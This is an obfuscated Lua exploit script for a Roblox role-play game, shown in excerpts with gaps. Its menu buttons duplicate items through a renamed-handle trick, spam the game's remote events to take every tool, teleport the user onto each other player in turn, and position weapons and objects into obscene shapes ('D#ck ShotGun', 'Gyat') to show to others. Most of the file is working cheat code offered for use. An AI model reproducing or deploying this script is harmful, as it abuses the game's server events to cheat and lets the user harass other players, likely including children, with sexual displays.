																			toollel.Parent = game.Players.LocalPlayer.Backpack;
																			FlatIdent_36708 = 1;
																		end
																		if (FlatIdent_36708 == 1) then
																			FlatIdent_BA44 = 1;
																			break;
																		end
																	end
																...
																if (FlatIdent_BA44 == 1) then
																	local FlatIdent_31AF7 = 0;
																	while true do
																		if (FlatIdent_31AF7 == 0) then
																			toollel.Parent = game.Players.LocalPlayer.Character;
																			tollllahhhh = toollel;
																			FlatIdent_31AF7 = 1;
																		end
																		if (FlatIdent_31AF7 == 1) then
																			FlatIdent_BA44 = 2;
																			break;
																		end
																	end
						...
						for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
							if toollll:IsA("Tool") then
								if (toollll.Name == toolselcted) then
									local FlatIdent_77CD3 = 0;
									while true do
										if (FlatIdent_77CD3 == 0) then
											toollllfoun = true;
											for nana, jjsjsj in pairs(toollll:GetDescendants()) do
												if (jjsjsj.Name == "Handle") then
													...
													while true do
														if (FlatIdent_89506 == 1) then
															local FlatIdent_3B238 = 0;
															while true do
																if (0 == FlatIdent_3B238) then
																	jjsjsj.Name = "H⁥a⁥n⁥d⁥l⁥e";
																	toollll.Parent = game.Players.LocalPlayer.Backpack;
																	FlatIdent_3B238 = 1;
																end
																if (FlatIdent_3B238 == 1) then
																	FlatIdent_89506 = 2;
																	break;
																end
															end
						...
						if (toollllfoun == true) then
							local FlatIdent_3D293 = 0;
							local FlatIdent_6E70E;
							while true do
								if (FlatIdent_3D293 == 0) then
									FlatIdent_6E70E = 0;
									while true do
						...
						wait(2);
						for m = 1, dupeamot do
							local FlatIdent_4B37E = 0;
							local FlatIdent_469C1;
							local args;
							while true do
								if (FlatIdent_4B37E == 1) then
									while true do
										if (FlatIdent_469C1 == 0) then
											local FlatIdent_2DE5D = 0;
											while true do
												if (FlatIdent_2DE5D == 1) then
													if (m <= dupeamot) then
														game:GetService("StarterGui"):SetCore("SendNotification", {
															["Title"] = "Dupe Script",
															["Text"] = "Now you got"   .. " "   .. m   .. " "   .. "Duped"   .. " "   .. toolselcted   .. "!" ,
												...
												if (FlatIdent_2DE5D == 0) then
													if (duping == false) then
														local FlatIdent_71335 = 0;
														while true do
															if (FlatIdent_71335 == 0) then
																local FlatIdent_1CD7F = 0;
																while true do
																	if (0 == FlatIdent_1CD7F) then
																		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																		return;
																	end
																end
										...
										if (FlatIdent_469C1 == 2) then
											local FlatIdent_3F582 = 0;
											while true do
												if (FlatIdent_3F582 == 1) then
													game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "H⁥a⁥n⁥d⁥l⁥e";
													FlatIdent_469C1 = 3;
													break;
												end
												if (FlatIdent_3F582 == 0) then
													if (duping == false) then
														local FlatIdent_16C4C = 0;
														local FlatIdent_95679;
														while true do
															if (0 == FlatIdent_16C4C) then
																FlatIdent_95679 = 0;
																while true do
										...
										if (FlatIdent_469C1 == 3) then
											game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
											game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
											repeat
												local FlatIdent_95D74 = 0;
												local FlatIdent_3EE1C;
												while true do
													if (FlatIdent_95D74 == 0) then
														FlatIdent_3EE1C = 0;
														while true do
															if (FlatIdent_3EE1C == 0) then
																if game:GetService("Workspace"):FindFirstChild("Camera") then
																	game:GetService("Workspace"):FindFirstChild("Camera"):Destroy();
																end
																task.wait();
						...
						if ( #tools == 0) then
							...
							local FlatIdent_89EEE;
							while true do
								if (0 == FlatIdent_25F6B) then
									FlatIdent_89EEE = 0;
									while true do
										if (FlatIdent_89EEE == 0) then
											local FlatIdent_6EB28 = 0;
											while true do
												if (FlatIdent_6EB28 == 0) then
													print(".");
													return;
												end
											end
						...
						for index = 1, math.min(5, #tools) do
							...
							local gripPos = TablaGripPos[gripPosIndex];
							if tool:IsDescendantOf(player.Character) then
								local FlatIdent_597FE = 0;
								local FlatIdent_4C7BB;
								while true do
									if (FlatIdent_597FE == 0) then
										FlatIdent_4C7BB = 0;
										while true do
											if (0 == FlatIdent_4C7BB) then
												tool.GripPos = gripPos;
												print("Założono narzędzie:", tool.Name, "z GripPos:", gripPos);
												break;
											end
							...
							if (player.Character:FindFirstChild("Sign") and player.Character.Sign:FindFirstChild("ToolSound")) then
								...
								local FlatIdent_F668;
								while true do
									if (FlatIdent_6F1A0 == 0) then
										FlatIdent_F668 = 0;
										while true do
											if (FlatIdent_F668 == 0) then
												player.Character.Sign.ToolSound:FireServer(unpack(args));
												print("Fired FireServer with letter: "   .. letter );
												break;
											end
						...
						LocalPlayer = Players.LocalPlayer;
						function equipAllTools()
							local FlatIdent_712D0 = 0;
							local FlatIdent_7EBEF;
							while true do
								if (FlatIdent_712D0 == 0) then
									FlatIdent_7EBEF = 0;
									while true do
										if (FlatIdent_7EBEF == 1) then
											for _, tool in pairs(backpack:GetChildren()) do
												if tool:IsA("Tool") then
													tool.Parent = character;
												end
										...
										if (FlatIdent_7EBEF == 0) then
											local FlatIdent_4679E = 0;
											while true do
												if (FlatIdent_4679E == 1) then
													FlatIdent_7EBEF = 1;
													break;
												end
												if (FlatIdent_4679E == 0) then
													backpack = LocalPlayer.Backpack;
													character = LocalPlayer.Character;
													FlatIdent_4679E = 1;
												end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						local toolNames = {"Bloxaide","Coke","BottledWater","Milk","Mocha","ShakeChocolate","FrapStrawberry","FrapMint","Icecream","Hershey","Reeses","CottonCandyPurple","CakePink","Donut","CookieChip","YummyBread","MuffinBlueBerry","Pizza","Pretzel","Waffle","Guda","Burrito","HotDog","Chips","Popcorn","Sandwich","Taco","Hamburger","AppleGreen","BreakfestPlate1","BurgerTray","DinnerPlate3","DinnerPlate1","Banana","Apple","DinnerPlate2","LunchPlate1","PrisonTray","TakeOutPizza","FoodTray","FoodCart","TakeOutHappyBurger","TakeOut","Weights","Mop","SoccerBall","Basketball","Vacuum","LaundryBasket","Box","Shovel","Bucket","WateringCan","Ladder","Cones","LawnMower","StopSign","FireX","Wrench","Axe","Hammer","Guitar","Roses","Present","Camcorder","ElectricGuitar","Microphone","Balloon","SleepingBag","FishingRod","Umbrella","Marshmello","HandRadio","Binocks","FlashLight","GhostMeter","CreditCardGirl","DuffleBagMoney","Money","CreditCardBoy","DuffleBag","Bomb","Bow","SwordWood","Sniper","Assault","Glock","GlockBrown","Shotgun","Cuffs","Taser","PlaneTicket","Hairbrush","Toothbrush","CarryOn","Trophy","SWATShield","Ear","Stretcher","Stethoscope","Medicine","Wagon","BabyMonkey","BabyBottle","Stroller","BabyHippo","BabyGirl","BabyBoy","Licence","Paper","ClipBoard","Ticket","Envelope","Book","Sign","Paperbag","ShoppingCart","Laptop","PropMaker","Ipad","Iphone"};
						local replicatedStorage = game:GetService("ReplicatedStorage");
						local remoteEvent = replicatedStorage.RE:FindFirstChild("1Too1l");
						if remoteEvent then
							for _, toolName in ipairs(toolNames) do
								remoteEvent:InvokeServer("PickingTools", toolName);
							end
						end
						local players = game:GetService("Players");
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local function changeTarget()
							...
							while true do
								...
								if (FlatIdent_57145 == 1) then
									if ( #others > 0) then
										local FlatIdent_8DB50 = 0;
										local FlatIdent_2C5EA;
										while true do
											if (0 == FlatIdent_8DB50) then
												FlatIdent_2C5EA = 0;
												while true do
						...
						player.CharacterAdded:Connect(function(character)
							local FlatIdent_7F076 = 0;
							local FlatIdent_6D3D2;
							while true do
								if (0 == FlatIdent_7F076) then
									FlatIdent_6D3D2 = 0;
									while true do
						...
						local function teleportToPlayers()
							for _, targetPlayer in pairs(game.Players:GetPlayers()) do
								if (targetPlayer ~= player) then
									local FlatIdent_69525 = 0;
									local targetCharacter;
									while true do
										if (FlatIdent_69525 == 0) then
											targetCharacter = targetPlayer.Character;
											if (targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")) then
												local FlatIdent_89DC = 0;
												while true do
													if (FlatIdent_89DC == 0) then
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local function equipInventoryItems()
							...
							local FlatIdent_7E96E;
							local backpack;
							while true do
								if (FlatIdent_88B43 == 1) then
									while true do
										if (FlatIdent_7E96E == 0) then
											backpack = player.Backpack;
											for _, item in ipairs(backpack:GetChildren()) do
												if item:IsA("Tool") then
													item.Parent = character;
						...
						local function changeTarget()
							...
							while true do
								if (FlatIdent_23FFF == 1) then
									if ( #others > 0) then
										local FlatIdent_7B490 = 0;
										while true do
											if (0 == FlatIdent_7B490) then
												currentTarget = others[math.random(1, #others)];
												camera.CameraSubject = currentTarget.Character:FindFirstChild("Humanoid");
												break;
											end
								...
								if (FlatIdent_23FFF == 0) then
									local FlatIdent_952B6 = 0;
									while true do
										if (FlatIdent_952B6 == 0) then
											others = {};
											for _, p in pairs(Players:GetPlayers()) do
												if (p ~= player) then
													table.insert(others, p);
						...
						player.CharacterAdded:Connect(function(character)
							local FlatIdent_502E5 = 0;
							while true do
								if (FlatIdent_502E5 == 0) then
									camera.CameraSubject = player.Character:FindFirstChild("Humanoid");
									currentTarget = nil;
									break;
								end
						...
						local function teleportToPlayers()
							for _, targetPlayer in pairs(game.Players:GetPlayers()) do
								if (targetPlayer ~= player) then
									local FlatIdent_800C = 0;
									local targetCharacter;
									while true do
										if (FlatIdent_800C == 0) then
											targetCharacter = targetPlayer.Character;
											if (targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")) then
												local FlatIdent_51289 = 0;
												local FlatIdent_16AD9;
												while true do
													if (FlatIdent_51289 == 0) then
														FlatIdent_16AD9 = 0;
														while true do
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local character = player.Character or player.CharacterAdded:Wait() ;
						local function equipInventoryItems()
							local FlatIdent_1E476 = 0;
							local backpack;
							while true do
								if (FlatIdent_1E476 == 0) then
									backpack = player.Backpack;
									for _, item in ipairs(backpack:GetChildren()) do
										if item:IsA("Tool") then
											item.Parent = character;
								...
								if (FlatIdent_31AAD == 1) then
									while true do
										...
										if (FlatIdent_61CE8 == 1) then
											if ( #others > 0) then
												local FlatIdent_731A9 = 0;
												local FlatIdent_5CDA1;
												while true do
													if (FlatIdent_731A9 == 0) then
														FlatIdent_5CDA1 = 0;
														while true do
															if (FlatIdent_5CDA1 == 0) then
																currentTarget = others[math.random(1, #others)];
																camera.CameraSubject = currentTarget.Character:FindFirstChild("Humanoid");
																break;
															end
						...
						local function teleportToPlayers()
							for _, targetPlayer in pairs(game.Players:GetPlayers()) do
								if (targetPlayer ~= player) then
									local FlatIdent_79F38 = 0;
									local FlatIdent_7F215;
									local targetCharacter;
									while true do
										if (FlatIdent_79F38 == 0) then
											FlatIdent_7F215 = 0;
											targetCharacter = nil;
											FlatIdent_79F38 = 1;
										end
										if (FlatIdent_79F38 == 1) then
											while true do
												if (FlatIdent_7F215 == 0) then
													targetCharacter = targetPlayer.Character;
													if (targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")) then
														local FlatIdent_61FEE = 0;
														local FlatIdent_63204;
														while true do
															if (FlatIdent_61FEE == 0) then
																FlatIdent_63204 = 0;
																while true do
				...
				Tab:AddButton({
					["Name"] = "ElectricGuitar All Players",
					["Callback"] = function()
						local args = {
							[1] = "PickingTools",
							[2] = "ElectricGuitar"
						...
						local character = player.Character or player.CharacterAdded:Wait() ;
						local function equipInventoryItems()
							local FlatIdent_59301 = 0;
							local FlatIdent_600AF;
							local backpack;
							while true do
								if (0 == FlatIdent_59301) then
									FlatIdent_600AF = 0;
									backpack = nil;
									FlatIdent_59301 = 1;
								end
								if (1 == FlatIdent_59301) then
									while true do
										if (FlatIdent_600AF == 0) then
											backpack = player.Backpack;
											for _, item in ipairs(backpack:GetChildren()) do
												if item:IsA("Tool") then
													item.Parent = character;
						...
						local function changeTarget()
							...
							while true do
								if (FlatIdent_62C84 == 1) then
									if ( #others > 0) then
										local FlatIdent_70B41 = 0;
										local FlatIdent_98D0D;
										while true do
											if (FlatIdent_70B41 == 0) then
												FlatIdent_98D0D = 0;
												while true do
								...
								if (FlatIdent_62C84 == 0) then
									local FlatIdent_90CB9 = 0;
									while true do
										if (FlatIdent_90CB9 == 1) then
											FlatIdent_62C84 = 1;
											break;
										end
										if (FlatIdent_90CB9 == 0) then
											others = {};
											for _, p in pairs(Players:GetPlayers()) do
												if (p ~= player) then
													table.insert(others, p);
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local function changeTarget()
							...
							while true do
								...
								if (FlatIdent_80792 == 1) then
									if ( #others > 0) then
										local FlatIdent_14559 = 0;
										local FlatIdent_84C91;
										while true do
											if (FlatIdent_14559 == 0) then
												FlatIdent_84C91 = 0;
												while true do
						...
						local function teleportToPlayers()
							for _, targetPlayer in pairs(game.Players:GetPlayers()) do
								if (targetPlayer ~= player) then
									local FlatIdent_47719 = 0;
									local targetCharacter;
									while true do
										if (0 == FlatIdent_47719) then
											targetCharacter = targetPlayer.Character;
											if (targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")) then
												local FlatIdent_7F564 = 0;
												while true do
													if (0 == FlatIdent_7F564) then
														character:SetPrimaryPartCFrame(targetCharacter.HumanoidRootPart.CFrame);
														wait(0.4);
														break;
													end
				...
				Tab:AddButton({
					["Name"] = "Gun To The Head",
					["Callback"] = function()
						local FlatIdent_27A5F = 0;
						local args;
						local TablaGrip;
						while true do
							if (0 == FlatIdent_27A5F) then
								args = {
									[1] = "ClearAllTools"
								};
								game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							if (FlatIdent_27A5F == 1) then
								...
								while true do
									...
									if (FlatIdent_55FDA == 1) then
										FlatIdent_27A5F = 2;
										break;
									end
								end
							end
							if (2 == FlatIdent_27A5F) then
								wait(0.3);
								TablaGrip = {
									CFrame.new( -0.5, -0.7, 0.5) * CFrame.Angles(math.rad(10), 3, 0)
								};
								FlatIdent_27A5F = 3;
							end
							if (FlatIdent_27A5F == 3) then
								for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
									if tool:IsA("Tool") then
										local FlatIdent_286D4 = 0;
										local FlatIdent_8C46;
										local gripIndex;
										local grip;
										while true do
												...
												while true do
													if (FlatIdent_8C46 == 0) then
														...
														while true do
															...
															if (FlatIdent_2205B == 1) then
																FlatIdent_8C46 = 1;
																break;
															end
														end
													end
													if (FlatIdent_8C46 == 1) then
														grip = TablaGrip[gripIndex];
														if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
															tool.Grip = grip;
														else
				...
				Tab:AddButton({
					["Name"] = "Grey Cat Hat",
					["Callback"] = function()
						local FlatIdent_1CD3F = 0;
						local args;
						local TablaGripPos;
						while true do
							if (FlatIdent_1CD3F == 0) then
								args = {
									[1] = "ClearAllTools"
								};
								game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							if (FlatIdent_1CD3F == 2) then
								TablaGripPos = {
									Vector3.new(0.5, -3, -0.2)
								};
								for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
									if tool:IsA("Tool") then
										local FlatIdent_1DC44 = 0;
										local gripPosIndex;
										local gripPos;
										while true do
											if (FlatIdent_1DC44 == 0) then
												tool.Parent = game.Players.LocalPlayer.Character;
												gripPosIndex = math.min(i, #TablaGripPos);
												FlatIdent_1DC44 = 1;
											end
											if (FlatIdent_1DC44 == 1) then
												gripPos = TablaGripPos[gripPosIndex];
												if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
													tool.GripPos = gripPos;
												else
					...
					["Callback"] = function()
						...
						while true do
							...
							if (FlatIdent_76CE3 == 2) then
								...
								for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
									if tool:IsA("Tool") then
										...
										local FlatIdent_16845;
										local gripPosIndex;
										local gripPos;
										while true do
											if (FlatIdent_7F408 == 1) then
												gripPos = nil;
												while true do
													if (FlatIdent_16845 == 0) then
														local FlatIdent_6D184 = 0;
														while true do
															if (FlatIdent_6D184 == 0) then
																tool.Parent = game.Players.LocalPlayer.Character;
																gripPosIndex = math.min(i, #TablaGripPos);
																FlatIdent_6D184 = 1;
															end
															if (FlatIdent_6D184 == 1) then
																FlatIdent_16845 = 1;
																break;
															end
														end
													end
													if (FlatIdent_16845 == 1) then
														gripPos = TablaGripPos[gripPosIndex];
														if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
															tool.GripPos = gripPos;
														else
							...
							if (0 == FlatIdent_76CE3) then
								local FlatIdent_49485 = 0;
								while true do
									if (FlatIdent_49485 == 0) then
										args = {
											[1] = "ClearAllTools"
										};
										game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args));
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_7D04A;
						local args;
						local TablaGripPos;
						while true do
							if (FlatIdent_54B77 == 0) then
								FlatIdent_7D04A = 0;
								args = nil;
								FlatIdent_54B77 = 1;
							end
							if (FlatIdent_54B77 == 1) then
								...
								while true do
									...
									if (FlatIdent_7D04A == 2) then
										TablaGripPos = {
											Vector3.new( -5, 0, -1)
										};
										for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
											if tool:IsA("Tool") then
												local FlatIdent_5F3D3 = 0;
												local gripPosIndex;
												local gripPos;
												while true do
													if (FlatIdent_5F3D3 == 1) then
														gripPos = TablaGripPos[gripPosIndex];
														if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
															tool.GripPos = gripPos;
														else
				...
				Tab:AddDropdown({
					...
					["Callback"] = function(Value)
						if (Value == "D#ck ShotGun") then
							local FlatIdent_7F789 = 0;
							local args;
							local TablaGripPos;
							while true do
								if (FlatIdent_7F789 == 1) then
									local FlatIdent_4B8A0 = 0;
									while true do
										if (FlatIdent_4B8A0 == 0) then
											args = {
												[1] = "PickingTools",
										...
										if (1 == FlatIdent_4B8A0) then
											FlatIdent_7F789 = 2;
											break;
										end
									end
								end
								if (0 == FlatIdent_7F789) then
									...
									while true do
										...
										if (FlatIdent_97B89 == 1) then
											FlatIdent_7F789 = 1;
											break;
										end
									end
								end
								if (FlatIdent_7F789 == 3) then
									for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
										if tool:IsA("Tool") then
								...
								if (FlatIdent_7F789 == 2) then
									wait(0.1);
									TablaGripPos = {
										Vector3.new(0.1, 1, -0.6)
									};
									FlatIdent_7F789 = 3;
								end
							end
						elseif (Value == "D#ck Assault") then
							local FlatIdent_1E8F5 = 0;
							local FlatIdent_578AF;
							local args;
							local TablaGripPos;
							while true do
								if (1 == FlatIdent_1E8F5) then
									TablaGripPos = nil;
									while true do
										if (FlatIdent_578AF == 2) then
											local FlatIdent_5090 = 0;
											while true do
												if (FlatIdent_5090 == 1) then
													FlatIdent_578AF = 3;
												...
												if (0 == FlatIdent_5090) then
													wait(0.1);
													TablaGripPos = {
														Vector3.new(0.8, 2, 1.2)
													};
													FlatIdent_5090 = 1;
												end
											end
										end
										if (FlatIdent_578AF == 3) then
											for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
												if tool:IsA("Tool") then
													local FlatIdent_3024 = 0;
													local FlatIdent_20AB9;
													local gripPosIndex;
													local gripPos;
													while true do
								...
								if (FlatIdent_1E8F5 == 0) then
									FlatIdent_578AF = 0;
									args = nil;
									FlatIdent_1E8F5 = 1;
								end
							end
						elseif (Value == "D#ck Glock") then
							local FlatIdent_3D5F8 = 0;
							local args;
							local TablaGripPos;
							while true do
								if (FlatIdent_3D5F8 == 2) then
									wait(0.1);
									TablaGripPos = {
										Vector3.new(0.3, 2, -0.53)
									};
									FlatIdent_3D5F8 = 3;
								end
								if (FlatIdent_3D5F8 == 0) then
									args = {
										[1] = "ClearAllTools"
									};
									game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args));
						...
						elseif (Value == "D#ck Glock Brown") then
							local FlatIdent_67BC5 = 0;
							local FlatIdent_823E1;
							local args;
							local TablaGripPos;
							while true do
								if (FlatIdent_67BC5 == 1) then
									TablaGripPos = nil;
									while true do
										if (FlatIdent_823E1 == 0) then
											local FlatIdent_4BD2 = 0;
											while true do
												if (FlatIdent_4BD2 == 1) then
													FlatIdent_823E1 = 1;
													break;
												end
												if (FlatIdent_4BD2 == 0) then
													args = {
														[1] = "ClearAllTools"
													};
													game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args));
										...
										if (3 == FlatIdent_823E1) then
											for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
												if tool:IsA("Tool") then
													local FlatIdent_207DC = 0;
													local FlatIdent_422F8;
													local gripPosIndex;
													local gripPos;
													while true do
														if (1 == FlatIdent_207DC) then
															gripPos = nil;
															while true do
																if (FlatIdent_422F8 == 1) then
																	gripPos = TablaGripPos[gripPosIndex];
																	if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
																		tool.GripPos = gripPos;
																	else
								...
								if (FlatIdent_67BC5 == 0) then
									FlatIdent_823E1 = 0;
									args = nil;
									FlatIdent_67BC5 = 1;
								end
							end
						elseif (Value == "D#ck Sword") then
							local FlatIdent_5F99E = 0;
							local args;
							local TablaGrip;
							while true do
								...
								if (2 == FlatIdent_5F99E) then
									wait(0.1);
									TablaGrip = {
										CFrame.new( -1.5, -1.9, 0) * CFrame.Angles(math.rad(180), 3.1, 0)
									};
									FlatIdent_5F99E = 3;
								end
								if (FlatIdent_5F99E == 3) then
									for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
										if tool:IsA("Tool") then
											local FlatIdent_41F4A = 0;
											local FlatIdent_E396;
											local gripIndex;
											local grip;
											while true do
												if (FlatIdent_41F4A == 1) then
													grip = nil;
													while true do
														...
														if (FlatIdent_E396 == 0) then
															local FlatIdent_46982 = 0;
															while true do
																if (FlatIdent_46982 == 0) then
																	tool.Parent = game.Players.LocalPlayer.Character;
																	gripIndex = math.min(i, #TablaGrip);
																	FlatIdent_46982 = 1;
																end
																if (1 == FlatIdent_46982) then
																	FlatIdent_E396 = 1;
																	break;
																end
															end
						...
						elseif (Value == "D#ck Rose") then
							local FlatIdent_706F1 = 0;
							local args;
							local TablaGripPos;
							while true do
								if (FlatIdent_706F1 == 2) then
									local FlatIdent_8CD12 = 0;
									while true do
										if (FlatIdent_8CD12 == 1) then
											FlatIdent_706F1 = 3;
											break;
										end
										if (FlatIdent_8CD12 == 0) then
											wait(0.1);
											TablaGripPos = {
								...
								if (FlatIdent_706F1 == 3) then
									for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
										if tool:IsA("Tool") then
											local FlatIdent_68C9B = 0;
											local FlatIdent_73151;
											local gripPosIndex;
											local gripPos;
											while true do
												if (FlatIdent_68C9B == 0) then
													FlatIdent_73151 = 0;
													gripPosIndex = nil;
													FlatIdent_68C9B = 1;
												end
												if (FlatIdent_68C9B == 1) then
													gripPos = nil;
													while true do
														if (FlatIdent_73151 == 0) then
															local FlatIdent_40EE8 = 0;
															while true do
																if (FlatIdent_40EE8 == 0) then
																	tool.Parent = game.Players.LocalPlayer.Character;
																	gripPosIndex = math.min(i, #TablaGripPos);
																	FlatIdent_40EE8 = 1;
																end
																if (FlatIdent_40EE8 == 1) then
																	FlatIdent_73151 = 1;
																	break;
																end
															end
														end
														if (FlatIdent_73151 == 1) then
															gripPos = TablaGripPos[gripPosIndex];
															if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
																tool.GripPos = gripPos;
															else
						...
						elseif (Value == "D#ck GhostMeter") then
							local FlatIdent_28142 = 0;
							local args;
							local TablaGripPos;
							while true do
								if (0 == FlatIdent_28142) then
									args = {
										[1] = "ClearAllTools"
									};
									game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args));
								...
								if (FlatIdent_28142 == 2) then
									wait(0.8);
									TablaGripPos = {
										Vector3.new(1.52, 1, -1)
									};
									FlatIdent_28142 = 3;
								end
								if (FlatIdent_28142 == 1) then
									local FlatIdent_2E03D = 0;
									while true do
										if (0 == FlatIdent_2E03D) then
											args = {
												[1] = "PickingTools",
												[2] = "GhostMeter"
											};
						...
						elseif (Value == "D#ck Hammer") then
							local FlatIdent_55794 = 0;
							local args;
							local TablaGrip;
							while true do
								if (FlatIdent_55794 == 3) then
									for i, tool in ipairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
										if tool:IsA("Tool") then
											local FlatIdent_8D340 = 0;
											local FlatIdent_96858;
											local gripIndex;
											local grip;
											while true do
												if (FlatIdent_8D340 == 1) then
													...
													while true do
														if (FlatIdent_96858 == 0) then
															local FlatIdent_95ADA = 0;
															while true do
																if (FlatIdent_95ADA == 0) then
																	tool.Parent = game.Players.LocalPlayer.Character;
																	gripIndex = ((i - 1) % #TablaGrip) + 1 ;
																	FlatIdent_95ADA = 1;
																end
																if (FlatIdent_95ADA == 1) then
																	FlatIdent_96858 = 1;
																	break;
																end
															end
								...
								if (FlatIdent_55794 == 2) then
									local FlatIdent_626D8 = 0;
									while true do
										if (FlatIdent_626D8 == 1) then
											FlatIdent_55794 = 3;
											break;
										end
										if (FlatIdent_626D8 == 0) then
											wait(0.8);
											TablaGrip = {
												CFrame.new(1.5, -1.8, 0.3) * CFrame.Angles(math.rad(180), 0, 0)
											};
											FlatIdent_626D8 = 1;
										end
									end
								end
								if (FlatIdent_55794 == 0) then
									args = {
										[1] = "ClearAllTools"
									};
									game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args));
				...
				Tab:AddDropdown({
					...
					["Callback"] = function(Value)
						if (Value == "Gyat (Balloon)") then
							...
							for m = 1, 2 do
								local FlatIdent_35A56 = 0;
								while true do
									if (FlatIdent_35A56 == 0) then
										task.wait();
										game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
										break;
									end
							...
							for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if toollel:IsA("Tool") then
									if (toollel.Name == toolselcted) then
										...
										for basc, aijfw in pairs(toollel:GetDescendants()) do
											if (aijfw.Name == "Handle") then
												local FlatIdent_22868 = 0;
												local FlatIdent_2C5AB;
												while true do
													if (0 == FlatIdent_22868) then
														FlatIdent_2C5AB = 0;
														while true do
															if (2 == FlatIdent_2C5AB) then
																task.wait();
																break;
															end
															if (FlatIdent_2C5AB == 1) then
																toollel.Parent = game.Players.LocalPlayer.Character;
																tollllahhhh = toollel;
																FlatIdent_2C5AB = 2;
															end
															if (FlatIdent_2C5AB == 0) then
																local FlatIdent_2A79 = 0;
																while true do
																	if (FlatIdent_2A79 == 0) then
																		aijfw.Name = "H⁥a⁥n⁥d⁥l⁥e";
																		toollel.Parent = game.Players.LocalPlayer.Backpack;
																		FlatIdent_2A79 = 1;
																	end
																	if (1 == FlatIdent_2A79) then
																		FlatIdent_2C5AB = 1;
																		break;
																	end
																end
							...
							for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
								if toollll:IsA("Tool") then
									if (toollll.Name == toolselcted) then
										local FlatIdent_178E3 = 0;
										local FlatIdent_5CB67;
										while true do
											if (FlatIdent_178E3 == 0) then
												FlatIdent_5CB67 = 0;
												while true do
							...
							if (toollllfoun == true) then
								...
								local FlatIdent_138C9;
								while true do
									if (0 == FlatIdent_8F6B8) then
										FlatIdent_138C9 = 0;
										while true do
											if (0 == FlatIdent_138C9) then
												if (game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil) then
													toollllfoun = false;
												end
												repeat
							...
							if (toollllfoun2 == true) then
								...
								local FlatIdent_980C6;
								while true do
									if (FlatIdent_5D777 == 0) then
										FlatIdent_980C6 = 0;
										while true do
											if (1 == FlatIdent_980C6) then
												toollllfoun2 = false;
												break;
											end
											if (FlatIdent_980C6 == 0) then
												if (game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil) then
													toollllfoun2 = false;
												end
												repeat
							...
							for m = 1, dupeamot do
								...
								while true do
									...
									if (FlatIdent_16868 == 1) then
										while true do
											if (FlatIdent_37710 == 2) then
												local FlatIdent_695E1 = 0;
												while true do
													if (FlatIdent_695E1 == 1) then
														game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "H⁥a⁥n⁥d⁥l⁥e";
														FlatIdent_37710 = 3;
														break;
													end
													if (0 == FlatIdent_695E1) then
														if (duping == false) then
															local FlatIdent_407C6 = 0;
															local FlatIdent_69991;
															while true do
																if (0 == FlatIdent_407C6) then
																	FlatIdent_69991 = 0;
																	while true do
																		if (FlatIdent_69991 == 0) then
																			local FlatIdent_45C57 = 0;
																			while true do
																				if (FlatIdent_45C57 == 0) then
																					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																					return;
																				end
																			end
											...
											if (0 == FlatIdent_37710) then
												local FlatIdent_3584D = 0;
												while true do
													if (FlatIdent_3584D == 0) then
														if (duping == false) then
															local FlatIdent_4C71 = 0;
															local FlatIdent_7ABC9;
															while true do
																if (FlatIdent_4C71 == 0) then
																	FlatIdent_7ABC9 = 0;
																	while true do
																		if (FlatIdent_7ABC9 == 0) then
																			local FlatIdent_207B = 0;
																			while true do
																				if (FlatIdent_207B == 0) then
																					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																					return;
																				end
																			end
